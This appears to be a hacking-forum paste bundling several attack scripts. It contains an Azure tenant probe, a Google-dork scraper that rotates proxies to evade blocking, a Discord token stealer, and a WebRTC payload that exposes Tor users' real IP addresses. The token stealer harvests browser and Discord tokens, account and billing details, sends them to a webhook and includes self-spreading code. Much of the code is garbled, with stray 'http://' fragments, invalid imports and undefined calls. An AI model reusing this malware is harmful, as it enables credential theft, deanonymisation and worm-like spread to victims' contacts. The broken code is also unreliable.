import requests
import sys

url = input("Enter the URL: ")

try:
    response = requests.get(f"https://login.microsoftonline.com{url}/v2.0/.well-known/openid-configuration")

    if response.status_code == 200:
        print(response.text)
    elif response.status_code == 400:
        print("Target is not vulnerable")
    else:
        print(f"Unexpected status code: {response.status_code}")
except requests.exceptions.RequestException as e:
    print(f"Error: {e}")
    sys.exit(1)



    his script Dap and I wrote to bypass google's sorry filter the concept was by @123456
 when he posted his so we made our own here it is.
#!/usr/bin/env python3

import os
import time
import random
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
import requests
from termcolor import colored

def get_proxies():
    proxies = []
    if not os.path.exists("proxies.txt"):
        url = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&limit=5000"
        proxies = requests.get(url).text.split("\n")
        with open("proxies.txt", "w") as f:
            f.write("\n".join(proxies))
    else:
        with open("proxies.txt", "r") as f:
            proxies = http://f.read().split("\n")
    return proxies

def test_proxy(proxy, user_agent, verbose):
    test_url = "https://bing.com"
    headers = {"User-Agent": user_agent}
    try:
        proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        response = requests.get(test_url, headers=headers, proxies=proxies, timeout=3)
        print(colored(f"Scraping good proxies...","blue"))
        if response.status_code == 200:
            print(colored(f"Good proxy found: {proxy}", "green"))
            return True
    except requests.exceptions.ConnectTimeout:
        if verbose:
            print(colored(f"Connection timeout for proxy: {proxy}", "red"))
    except requests.exceptions.ProxyError:
        if verbose:
            print(colored(f"Proxy error for proxy: {proxy}", "red"))
    except requests.exceptions.RequestException as e:
        if verbose:
            print(colored(f"Request exception for proxy: {proxy}, error: {e}", "red"))
    return False

def filter_working_proxies(proxies, user_agents, verbose):
    working_proxies = []
    user_agent = random.choice(user_agents)
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures_to_proxies = {executor.submit(test_proxy, proxy, user_agent, verbose): proxy for proxy in proxies}
        for future in as_completed(futures_to_proxies):
            if future.result():
                working_proxies.append(futures_to_proxies[future])
    return working_proxies

def get_user_agents():
    with open("useragents.txt", "r") as f:
        return http://f.read().split("\n")

def google_search(query, user_agent, proxy):
    url = f"https://google.com/search?q={query}"
    headers = {"User-Agent": user_agent}
    proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    response = requests.get(url, headers=headers, proxies=proxies, timeout=10)
    soup = BeautifulSoup(response.text, "html.parser")
    return [result["href"] for result in http://soup.select(".yuRUbf a")]
       
def search_dork(dork, proxies, user_agents, verbose, max_retries=3, backoff_factor=1.0):
    print(colored(f"Searching for dork: {dork}", "yellow"))

    def try_search_dork(dork, proxy, user_agent):
        try:
            results = google_search(dork, user_agent, proxy)
            return results
        except requests.exceptions.RequestException as e:
            if verbose:
                print(colored(f"Error with proxy {proxy}: {e}, rotating proxy...", "magenta"))
            return None

    retries = 0
    while retries <= max_retries:
        proxy = random.choice(proxies)
        user_agent = random.choice(user_agents)
        results = try_search_dork(dork, proxy, user_agent)

        if results is not None:
            if results:
                with open(f"results/{dork}_results.txt", "w") as f:
                    f.write("\n".join(results[:20]))
                print(colored(f"Saved top 20 results for dork '{dork}'", "green"))
            else:
                print(colored(f"No results found for dork '{dork}'", "red"))
            break

        retries += 1
        time.sleep(backoff_factor * (2 ** (retries - 1)) + random.uniform(1, 5))

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-v", "--verbose", help="Display errors with proxies.", action="store_true")
    args = parser.parse_args()

    dorks = []
    with open("dorks.txt", "r") as f:
        dorks = http://f.read().split("\n")

    user_agents = get_user_agents()
    proxies = filter_working_proxies(get_proxies(), user_agents, args.verbose)

    if not os.path.exists("results"):
        os.makedirs("results")

    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(search_dork, dork, proxies, user_agents, args.verbose): dork for dork in dorks}
        for future in as_completed(futures):
            future.result()

if __name__ == "__main__":
    main()





    Here since the skids wanna python.
#!/usr/bin/python
import os
if http://os.name != "nt":
    exit()
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from threading import Thread
from time import sleep
from sys import argv
from json import json
WEBHOOK_URL = "" # Insert webhook url here
from json import json
from time import time
from import request import requests

x = False
l = ""

def on_key_press(event):
    global x, l
    l += event.key
    x = True

def send_to_webhook():
    global x, l
    if x:
        http://requests.post(
            "//discord.com/api/webhook/...",
            headers={"Content-Type": "application/json"},
            data=json.dumps({"content": l}),
        )
        x = False

while True:
    send_to_webhook()
    time.sleep(1)

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord": ROAMING + "\\Discord",
    "Discord Canary": ROAMING + "\\discordcanary",
    "Discord PTB": ROAMING + "\\discordptb",
    "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera": ROAMING + "\\Opera Software\\Opera Stable",
    "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}

def getHeader(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

def getUserData(token):
    try:
        return loads(
            urlopen(Request("https://discordapp.com/api/v9/users/@me", headers=getHeader(token))).read().decode())
    except:
        pass

def getTokenz(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens

def whoami():
    ip = "None"
    try:
        ip = urlopen(Request("https://ifconfig.me")).read().decode().strip()
    except:
        pass
    return ip

def hWiD():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (http://p.stdout.read() + http://p.stderr.read()).decode().split("\n")[1]

def getFriends(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v9/users/@me/relationships",
                                     headers=getHeader(token))).read().decode())
    except:
        pass

def getChat(token, uid):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v9/users/@me/channels", headers=getHeader(token),
                                     data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
    except:
        pass

def paymentMethods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v9/users/@me/billing/payment-sources",
                                              headers=getHeader(token))).read().decode())) > 0)
    except:
        pass

def sendMessages(token, chat_id, form_data):
    try:
        urlopen(Request(f"https://discordapp.com/api/v9/channels/{chat_id}/messages", headers=getHeader(token,
                                                                                                         "multipart/form-data; boundary=---------------------------325414537030329320151394843687"),
                        data=form_data.encode())).read().decode()
    except:
        pass

def spread(token, form_data, delay):
    return  # Remove to re-enabled (If you remove this line, malware will spread itself by sending the binary to friends.)
    for friend in getFriends(token):
        try:
            chat_id = getChat(token, friend["id"])
            sendMessages(token, chat_id, form_data)
        except Exception as e:
            pass
        sleep(delay)

def main():
    cache_path = ROAMING + "\\.cache~$"
    prevent_spam = True
    self_spread = True
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    ip = whoTheFuckAmI()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    user_path_name = os.getenv("userprofile").split("\\")[2]
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in getTokenz(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getUserData(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            email = user_data.get("email")
            phone = user_data.get("phone")
            nitro = bool(user_data.get("premium_type"))
            billing = bool(paymentMethods(token))
            embed = {
                "color": 0x7289da,
                "fields": [
                    {
                        "name": "|Account Info|",
                        "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
                        "inline": True
                    },
                    {
                        "name": "|PC Info|",
                        "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
                        "inline": True
                    },
                    {
                        "name": "|Token|",
                        "value": token,
                        "inline": False
                    }
                ],
                "author": {
                    "name": f"{username} ({user_id})",
                },
                "footer": {
                    "text": f"Taylor C Newsome contents: Sleep[at]http://aol.com"
                }
            }
            embeds.append(embed)
    with open(cache_path, "a") as file:
        for token in checked:
            if not token in already_cached_tokens:
                file.write(token + "\n")
    if len(working) == 0:
        working.append('123')
    webhook = {
        "content": "Made by ClumsyLulz make this blank",
        "embeds": embeds,
        "username": "Discord XSS And Token Snatcher",
        "avatar_url": "https://i.imgur.com/SdVLAKU.png"
    }
    try:
        
        urlopen(Request(WEBHOOK_URL, data=dumps(webhook).encode(), headers=getHeader()))
    except:
        pass
    if self_spread:
        for token in working:
            with open(argv[0], encoding="utf-8") as file:
                content = http://file.read()
            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nDDoS tool. python download: https://python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
            Thread(target=spread, args=(token, payload, 7500 / 1000)).start()

try:
    main()
except Exception as e:
    print(e)
    pass
//# Made By ClumsyLulz


<?php
error_reporting(0);
set_time_limit(0);
ini_set(‘display_errors’, 0);
ini_set(‘max_execution_time’, 0);

/*
$exploit = “
<script type=’text/javascript’>
httpGet(‘http://localhost/evilsite.php?IP=[ IP START ]’) // Obtaining tor users home ip bypassing exit node
//get the IP addresses associated with an account

var ip2 = ‘’;
function getIPs(callback) {
var ip_dups = {};

//compatibility for firefox and chrome
var RTCPeerConnection = window.RTCPeerConnection
|| window.mozRTCPeerConnection
|| window.webkitRTCPeerConnection;
var mediaConstraints = {
optional: [{RtpDataChannels: true}]
};

//firefox already has a default stun server in about:config
// media.peerconnection.default_iceservers =
// [{‘url’: ‘stun:http://stun.services.mozilla.com’}]
var servers = undefined;

//add same stun server for chrome
if (window.webkitRTCPeerConnection)
servers = {iceServers: [{urls: ‘stun:http://stun.services.mozilla.com’}]};

//construct a new RTCPeerConnection
var pc = new RTCPeerConnection(servers, mediaConstraints);

//listen for candidate events
pc.onicecandidate = function(ice) {

//skip non-candidate events
if (ice.candidate) {

//match just the IP address
var ip_regex = /([0–9]{1,3}(\.[0–9]{1,3}){3})/;
var ip_addr = ip_regex.exec(ice.candidate.candidate)[1];

//remove duplicates
if (ip_dups[ip_addr] === undefined)
callback(ip_addr);

ip_dups[ip_addr] = true;
}
};

//create a bogus data channel
pc.createDataChannel(‘’);

//create an offer sdp
pc.createOffer(function(result) {

//trigger the stun server request
pc.setLocalDescription(result, function() {
}, function() {
});

}, function() {
});
}

//insert IP addresses into the page
getIPs(function(ip) {
envior(ip); //SUB PROCESSO
}
);

//ENVIO GET
function httpGet(url)
{
var xmlHttp = null;

xmlHttp = new XMLHttpRequest();
http://xmlHttp.open(‘GET’, url, false);
xmlHttp.send(null);
return xmlHttp.responseText;
}

function envior(valor) {
ip2 = ‘ — ‘ + valor.toString();
document.write(httpGet(‘http://localhost/evilsite.php?IP=’ + ip2));

//Tor will never be the same
//We out here cuz
}
</script>”;

echo $exploit;
